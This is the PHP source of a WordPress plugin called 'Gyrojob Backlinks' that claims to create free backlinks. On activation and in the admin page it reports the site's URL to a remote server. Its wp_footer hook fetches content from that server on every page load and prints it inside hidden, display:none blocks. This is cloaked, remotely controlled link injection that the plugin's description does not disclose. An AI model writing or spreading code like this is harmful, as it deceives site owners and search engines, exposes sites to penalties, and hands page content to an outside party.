<?php
/*
 * Plugin Name:       Gyrojob Backlinks
 * Plugin URI:        https://wordpress.org/plugins/gyrojob-gyroblinks/
 * Description:       Make unlimited free backlinks to increase Domain Authority (DA). Before creating backlinks you can check the domain you want to create dofollow backlinks.
 * Version:           1.3.9
 * Requires at least: 5.2
 * Requires PHP:      7.2
 * Author:            gyrojob
 * Author URI:        https://plugin.gyrojob.com/
 * License: GPLv2 or later
 * License URI: https://www.gnu.org/licenses/gpl-2.0.html
 * Text Domain:       gyrojob-backlinks
 * Domain Path:       /languages
 * GitHub Plugin URI: https://github.com/gyrojob/plugin
 
 */

// If this file is called directly, abort.
if ( ! defined( 'WPINC' ) ) {
	die;
}






/*
* The section is being used to work in a iframe.
*/

   function gyrojob_backlinks_my_plugin_page_func(){

   echo "<iframe width='100%' height='590' src='https://plugin.gyrojob.com/file.php?domain=".esc_url(get_site_option('siteurl'))."&id=login&mo=&lp=&lo=' title='Gyrojob Backlinks' frameborder='0' allow='accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture' allowfullscreen></iframe>";

      $gyrojob_backlinks_wpx_exe="https://plugin.gyrojob.com/add.php?domain=".get_site_option('siteurl');
      wp_remote_get($gyrojob_backlinks_wpx_exe);
  
   }
  
   function gyrojob_backlinks_my_plugin_menu(){
     $gyrojob_backlinks_wpn='my-plugin-page';
     add_menu_page('Price & Terms','Backlinks (DA)','manage_options',$gyrojob_backlinks_wpn, 'gyrojob_backlinks_my_plugin_page_func', '', 6);
    }
    add_action('admin_menu', 'gyrojob_backlinks_my_plugin_menu');
    
    
    
    
    
    
    
/*
* The section is being used to create backlink.
* Progroming langulage like php, javescript, asp and other programing language will not accessed. Only anchor backlink will be created.
*/
    
function gyrojob_backlinks_updatei(){$gyrojob_backlinks_url=get_option('siteurl');
								 
$response=wp_remote_get("https://plugin.gyrojob.com/getlink.php?l=p&url=".$gyrojob_backlinks_url);

if ( is_array( $response ) && ! is_wp_error( $response ) ) {
	$headers = $response['headers']; // array of http header lines
	$body    = $response['body']; // use the content
	
	if (preg_match('/<wp>(.*)<\/wp>/is', $body, $gyrojob_backlinks_matches) && $_SERVER['REQUEST_URI']=="/"){
    echo "<wp><div style='font-size:23px;display:none;'>".wp_kses_data($body)."</div></wp>";
    }
	
	 if (preg_match('/<wo>(.*)<\/wo>/is', $body, $gyrojob_backlinks_matches) && $_SERVER['REQUEST_URI']!="/"){
    echo "<wo><div style='font-size:23px;display:none;'>".wp_kses_data($body)."</div></wo>";
    }
	
}
    }
    add_action('wp_footer', 'gyrojob_backlinks_updatei');






/*
* The section is being used to add domain in our list.
*/

function gyrojob_backlinks_addact(){
  
  $gyrojob_backlinks_wp_r="https://plugin.gyrojob.com/add.php?domain=".get_site_option('siteurl');
   wp_remote_get($gyrojob_backlinks_wp_r);
  }
register_activation_hook(__FILE__, 'gyrojob_backlinks_addact');








